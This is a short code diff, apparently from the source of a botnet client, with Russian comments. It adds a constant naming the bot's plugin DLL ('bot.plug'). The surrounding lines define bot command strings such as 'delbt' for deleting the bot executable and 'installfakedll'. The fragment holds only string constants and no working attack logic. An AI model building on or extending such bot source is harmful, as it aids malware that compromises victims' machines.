@@ -85,6 +85,10 @@ CSSTR EStrProcessCommandDeleteBot[] = "delbt";  // Команда на удаление exe бота
 CSSTR EStrPrefixFileName[] = "mnprsdd.dat"; // Файл хранения префикса
 
 
+// Имена плагина бота в виде длл
+CSSTR EStrBotPlug[] = "bot.plug";
+
+
 // Перечень команд, которые может выполняь бот
 CSSTR CommandInstallFakeDLL[] = "installfakedll";
 
